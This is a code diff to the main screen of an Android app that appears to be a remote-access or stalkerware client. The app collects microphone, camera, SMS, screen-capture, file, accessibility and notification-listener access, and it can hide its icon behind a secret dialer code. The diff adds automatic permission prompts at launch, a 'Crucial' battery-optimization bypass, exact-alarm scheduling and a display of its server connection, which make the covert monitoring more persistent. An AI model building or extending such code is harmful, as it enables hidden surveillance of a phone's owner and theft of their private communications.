@@ -2,7 +2,11 @@ package com.example.admin
 
 import android.Manifest
 import android.app.Activity
+import android.app.AlarmManager
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.graphics.Typeface
@@ -22,6 +26,14 @@ class MainActivity : Activity() {
 
     private lateinit var statusText: TextView
     private lateinit var btnToggle: Button
+
+    private val connReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            if (intent?.action == ConnectionService.ACTION_STATUS) {
+                updateStatus()
+            }
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -48,7 +60,7 @@ class MainActivity : Activity() {
         configCard.addView(TextView(this).apply { text = "Configuration"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
         
         val nameEt = EditText(this).apply {
-            hint = "Device Name (e.g. John's Phone)"
+            hint = "Device Name"
             setText(Prefs.getDeviceName(this@MainActivity))
             setTextColor(Color.WHITE)
             setHintTextColor(Color.GRAY)
@@ -107,6 +119,8 @@ class MainActivity : Activity() {
         permCard.addView(createBtn("Request Runtime Permissions", "#1E1E1E", Color.WHITE) { requestPerms() })
         permCard.addView(createBtn("Grant Screen Capture", "#1E1E1E", Color.WHITE) { requestScreenCapture() })
         permCard.addView(createBtn("Allow All Files Access", "#1E1E1E", Color.WHITE) { requestAllFiles() })
+        permCard.addView(createBtn("Disable Battery Optimization (Crucial)", "#FF5252", Color.WHITE) { requestIgnoreBatteryOptimizations() })
+        
         permCard.addView(createBtn("Enable Accessibility Service", "#1E1E1E", Color.WHITE) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
         permCard.addView(createBtn("Enable Notification Listener", "#1E1E1E", Color.WHITE) { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) })
         root.addView(permCard)
@@ -117,6 +131,32 @@ class MainActivity : Activity() {
             Toast.makeText(this@MainActivity, "Icon hidden. Dial *#*#1337#*#* to unhide.", Toast.LENGTH_LONG).show()
         })
         root.addView(dangerCard)
+
+        // Auto-trigger basic permissions
+        statusText.postDelayed({ requestPerms() }, 1000)
+        
+        // Request Exact Alarm Permission for Android 12+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            val am = getSystemService(ALARM_SERVICE) as AlarmManager
+            if (!am.canScheduleExactAlarms()) {
+                startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM))
+            }
+        }
+    }
+
+    override fun onStart() {
+        super.onStart()
+        val filter = IntentFilter(ConnectionService.ACTION_STATUS)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(connReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(connReceiver, filter)
+        }
+    }
+
+    override fun onStop() {
+        super.onStop()
+        unregisterReceiver(connReceiver)
     }
 
     override fun onResume() {
@@ -140,6 +180,8 @@ class MainActivity : Activity() {
 
     private fun updateStatus() {
         val isRunning = Prefs.isRunning(this)
+        val isWsConnected = ConnectionService.isWsConnected
+
         if (isRunning) {
             btnToggle.text = "STOP SERVICE"
             btnToggle.background = getRoundRect("#FF5252")
@@ -151,6 +193,14 @@ class MainActivity : Activity() {
         }
 
         val sb = StringBuilder()
+        if (isRunning) {
+            if (isWsConnected) sb.append("✅ Server Connected\n")
+            else sb.append("🟡 Connecting to Server...\n")
+        } else {
+            sb.append("🔴 Service Offline\n")
+        }
+        sb.append("--------------------\n")
+
         sb.append(if (checkPerm(Manifest.permission.RECORD_AUDIO)) "✅ Microphone\n" else "❌ Microphone\n")
         sb.append(if (checkPerm(Manifest.permission.CAMERA)) "✅ Camera\n" else "❌ Camera\n")
         sb.append(if (checkPerm(Manifest.permission.READ_SMS)) "✅ SMS & Calls\n" else "❌ SMS & Calls\n")
@@ -214,7 +264,7 @@ class MainActivity : Activity() {
 
         val missing = perms.filter { !checkPerm(it) }
         if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 100)
-        else Toast.makeText(this, "All requested permissions granted.", Toast.LENGTH_SHORT).show()
+        else Toast.makeText(this, "All runtime permissions granted.", Toast.LENGTH_SHORT).show()
     }
 
     private fun requestScreenCapture() {
@@ -234,6 +284,19 @@ class MainActivity : Activity() {
             }
         } else {
             Toast.makeText(this, "All files access granted or not needed.", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun requestIgnoreBatteryOptimizations() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val intent = Intent()
+            intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+            intent.data = Uri.parse("package:$packageName")
+            try {
+                startActivity(intent)
+            } catch (e: Exception) {
+                Toast.makeText(this, "Please manually disable battery optimization in settings.", Toast.LENGTH_LONG).show()
+            }
         }
     }
 
